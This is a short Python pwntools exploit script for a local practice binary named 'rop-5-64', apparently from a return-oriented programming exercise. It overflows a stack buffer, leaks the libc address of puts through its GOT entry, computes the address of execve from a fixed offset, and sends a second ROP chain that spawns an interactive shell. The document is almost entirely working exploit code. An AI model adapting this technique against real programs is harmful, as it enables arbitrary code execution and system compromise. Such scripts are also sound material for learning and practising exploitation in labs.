#!/usr/bin/env python

from pwn import *

p = process("./rop-5-64")

got_of_puts = p.elf.got['puts']
puts_at_plt = p.elf.plt['puts']
input_func = p.elf.symbols['input_func']
#print("Got of printf %s" % hex(got_of_printf))
#print("Printf@plt %s" % hex(printf_at_plt))
#print("input_func() %s" % hex(input_func))

pop_rdi_ret = p64(0x0000000000400763)
pop_rsi_r15_ret = p64(0x0000000000400761)
pop_rdx_nop_pop_rbp_ret = p64(0x0000000000400688)

buf = "A" * 0x80 + "A"*8
buf += pop_rdi_ret
buf += p64(got_of_puts)
buf += p64(puts_at_plt)
buf += p64(input_func)
#print(buf)
p.recv()
p.sendline(buf)

data = p.recv()
print(repr(data))

raw_data = data[len(buf)-21:]
print(repr(raw_data))

libc_puts = (unpack(raw_data[:6],'all',endian='little',sign=True))
print(hex(libc_puts))

"""
$1 = {<text variable, no debug info>} 0x7fa6e428c690 <_IO_puts>
$2 = {<text variable, no debug info>} 0x7fa6e42e9770 <execve>
"""
offset = 0x7fa6e42e9770 - 0x7fa6e428c690
libc_execve = libc_puts + offset

#0x400020:   "@"
string = p64(0x400020)

buf = "A" * 0x80 + "BBBBBBBB"
buf += pop_rdi_ret
buf += string
buf += pop_rsi_r15_ret
buf += p64(0)
buf += p64(0)
buf += pop_rdx_nop_pop_rbp_ret
buf += p64(0)
buf += p64(0)
buf += p64(libc_execve)

p.sendline(buf)
p.interactive()

